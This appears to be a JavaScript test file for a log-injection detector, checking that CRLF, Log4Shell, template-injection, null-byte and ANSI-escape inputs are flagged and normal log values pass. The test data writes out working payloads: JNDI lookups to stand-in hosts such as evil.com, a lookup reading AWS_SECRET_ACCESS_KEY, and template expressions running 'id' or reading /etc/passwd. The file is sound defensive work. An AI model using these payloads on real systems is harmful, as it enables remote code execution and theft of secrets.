/**
 * specs/log.spec.js
 *
 * Tests for the LOG context.
 * Covers CRLF injection, Log4Shell (CVE-2021-44228), SSTI in log messages,
 * null byte injection, and ANSI escape sequences.
 */

import { isUnsafe, whyUnsafe, LOG } from '../src/index.js';

const unsafe = (v) => expect(isUnsafe(v, LOG)).toBe(true,  `expected UNSAFE: ${v}`);
const safe   = (v) => expect(isUnsafe(v, LOG)).toBe(false, `expected SAFE:   ${v}`);

// ─── CRLF injection ─────────────────────────────────────────────────────────

describe('LOG context — CRLF / newline injection', () => {
  it('flags literal newline characters', () => {
    unsafe("username\nfake log entry");
    unsafe("value\rinjected");
    unsafe("line1\r\nline2");
  });

  it('flags URL-encoded CRLF sequences', () => {
    unsafe('%0afake log entry');
    unsafe('%0d%0a[INFO] Injected');
    unsafe('value%0AINJECTED');
    unsafe('data%0D%0AINJECTED');
  });

  it('flags Unicode line/paragraph separators', () => {
    unsafe("value\u2028injected");   // U+2028 Line Separator
    unsafe("value\u2029injected");   // U+2029 Paragraph Separator
  });

  it('does not flag normal percent sequences', () => {
    safe('100%');
    safe('50% off');
    safe('progress: 75%');
    safe('%s format string');   // not %0a or %0d
  });
});

// ─── Log4Shell (CVE-2021-44228) ─────────────────────────────────────────────

describe('LOG context — Log4Shell / JNDI injection', () => {
  it('flags ${jndi:ldap://...} — the original Log4Shell vector', () => {
    unsafe('${jndi:ldap://evil.com/a}');
    unsafe('${jndi:rmi://attacker.com/payload}');
    unsafe('${jndi:dns://evil.com}');
  });

  it('flags ${jndi:...} case-insensitively', () => {
    unsafe('${JNDI:ldap://evil.com}');
    unsafe('${Jndi:ldap://evil.com}');
  });

  it('flags obfuscated Log4Shell ${::- bypass prefix', () => {
    // ${::-x} is the Log4j lookup-bypass escape; presence alone is flagged
    unsafe('${::-j}${::-n}${::-d}${::-i}:ldap://evil.com');
    unsafe('${${::-j}ndi:ldap://evil.com/a}');
  });

  it('flags Log4j data-exfiltration lookups', () => {
    unsafe('${env:AWS_SECRET_ACCESS_KEY}');
    unsafe('${sys:java.version}');
    unsafe('${ctx:loginId}');
    unsafe('${spring:some.property}');
  });

  it('does not flag plain shell variable references like ${PATH}', () => {
    // Plain variable names without operators/method calls are not flagged
    // (they look like shell vars, not SSTI expressions)
    safe('${PATH}');
    safe('${HOME}');
    safe('${USER}');
  });

  it('identifies Log4Shell via whyUnsafe', () => {
    const result = whyUnsafe('${jndi:ldap://evil.com/a}', LOG);
    expect(result).not.toBeNull();
    expect(result.id).toBe('log-log4shell-jndi');
  });
});

// ─── SSTI in log messages ────────────────────────────────────────────────────

describe('LOG context — Server-Side Template Injection (SSTI)', () => {
  it('flags {{expression}} — Jinja2, Twig, Handlebars', () => {
    unsafe('{{7*7}}');
    unsafe('{{config}}');
    unsafe('{{self._TemplateReference__context.cycler.__init__.__globals__}}');
    unsafe('Hello {{name}}');
  });

  it('flags #{expression} — Thymeleaf, Velocity, Ruby ERB', () => {
    unsafe('#{7*7}');
    unsafe('#{T(java.lang.Runtime).getRuntime().exec("id")}');
    unsafe('#{user.name}');
  });

  it('flags ${expression} with operators/method calls — JSP EL, Freemarker, SpEL', () => {
    // The dollar-brace rule requires expression content (., (, *, +, or SSTI keywords)
    // to distinguish from plain shell variable references like ${PATH}
    unsafe('${T(java.lang.Runtime).getRuntime().exec("id")}');
    unsafe('${applicationContext.getBean("service")}');
    unsafe('${7*7}');   // arithmetic — caught by * operator
  });

  it('does not flag simple ${VARNAME} shell variable references', () => {
    safe('${PATH}');
    safe('${HOME}');
  });

  it('flags <%= expression %> — Ruby ERB, ASP', () => {
    unsafe('<%= 7*7 %>');
    unsafe('<%= File.read("/etc/passwd") %>');
    unsafe('<%= system("id") %>');
  });

  it('does not flag template-like strings that are clearly content', () => {
    safe('{{not a template');      // missing closing }}
    safe('price: $9.99');          // $ without {
    safe('a # b');                  // # without {
  });
});

// ─── Null byte injection ─────────────────────────────────────────────────────

describe('LOG context — null byte injection', () => {
  it('flags literal null bytes', () => {
    unsafe('value\x00extra');
    unsafe('\x00');
  });

  it('flags URL-encoded null bytes', () => {
    unsafe('value%00.php');
    unsafe('%00injected');
  });

  it('does not flag normal zero values', () => {
    safe('0');
    safe('zero');
    safe('count: 0');
  });
});

// ─── ANSI escape injection ───────────────────────────────────────────────────

describe('LOG context — ANSI escape sequence injection', () => {
  it('flags ESC[ sequences that manipulate terminal output', () => {
    unsafe('\x1b[31mRED\x1b[0m');      // colour codes
    unsafe('\x1b[2J');                  // clear screen
    unsafe('\x1b[1A');                  // cursor up
    unsafe('normal\x1b[31mred\x1b[0m'); // embedded in text
  });

  it('does not flag strings with just ESC (without [)', () => {
    safe('\x1b');   // bare ESC without [
    safe('ESC key'); // word ESC
  });
});

// ─── Safe strings ────────────────────────────────────────────────────────────

describe('LOG context — safe strings', () => {
  it('passes typical log field values', () => {
    safe('john.doe');
    safe('192.168.1.1');
    safe('2024-01-15T10:30:00Z');
    safe('GET /api/users HTTP/1.1');
    safe('Mozilla/5.0 (compatible)');
    safe('order-12345');
  });

  it('passes normal user-supplied text without special chars', () => {
    safe('Hello World');
    safe('John Smith');
    safe('New York, NY 10001');
    safe('product name with spaces');
  });

  it('passes email addresses and URLs', () => {
    safe('user@example.com');
    safe('https://example.com/path');
  });

  it('passes strings with curly braces that are not templates', () => {
    safe('{}');           // empty object
    safe('{a: 1}');       // short, no closing }}
    safe('{name}');       // single brace — not {{}}
  });
});
